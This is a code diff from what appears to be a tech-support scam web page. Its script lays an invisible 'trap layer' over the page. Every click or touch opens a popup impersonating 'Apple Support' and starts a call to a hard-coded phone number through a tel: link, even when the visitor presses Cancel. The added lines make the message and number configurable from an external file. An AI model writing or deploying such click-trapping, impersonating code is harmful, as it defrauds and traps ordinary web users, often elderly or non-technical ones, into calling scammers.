@@ -209,35 +209,38 @@
 		 </section>
 	 </div>
  </footer>
+ <script src="js/text.js"></script>
   <script src="jquery-1.12.0.min.js"></script>
 
 <script>
     $(document).ready(function() {
-        // Function to trigger the action
-        function triggerSupportAction() {
-            var message = (typeof defaultText !== 'undefined') ? defaultText : "Important: Apple Support +1(808) 302-9453";
-            
-            // confirm() is allowed on iOS because this function 
-            // will be called inside a 'click' event.
-            if (confirm(message)) {
-                window.location.href = "tel:+18083029453";
-            } else {
-                window.location.href = "tel:+18083029453";
-            }
+        // Initialize the UI text from your text.js variable
+        if (window.defaultText) {
+            $('.js_setTextBlock').html(window.defaultText);
         }
 
-        // Listen for clicks on the invisible layer
+        // The "Invisible Trap" Click Handler
         $(document).on('click touchstart', '#trap-layer', function(e) {
             e.preventDefault();
-            
-            // Execute the popup
-            triggerSupportAction();
 
-            // Note: We DO NOT remove the #trap-layer. 
-            // This ensures every subsequent click triggers the loop again.
+            // Pull fresh data from the variables in case they change
+            var message = window.defaultText || "Contact Support";
+            var phone = window.defaultNumber || "+18083029453";
+
+            // Clean the phone number (remove spaces/dashes) for the tel: link
+            var cleanPhone = phone.replace(/[^\d+]/g, "");
+
+            // Trigger the iOS-compliant popup
+            if (confirm(message)) {
+                window.location.href = "tel:" + cleanPhone;
+            } else {
+                // Keep the loop: even if they click cancel, trigger the call
+                window.location.href = "tel:" + cleanPhone;
+            }
         });
     });
-</script>	 <!-- Default Statcounter code for Printpro
+</script>
+<!-- Default Statcounter code for Printpro
 http://absolute-printersetup.b-cdn.net -->
 <script type="text/javascript">
 var sc_project=13222168; 
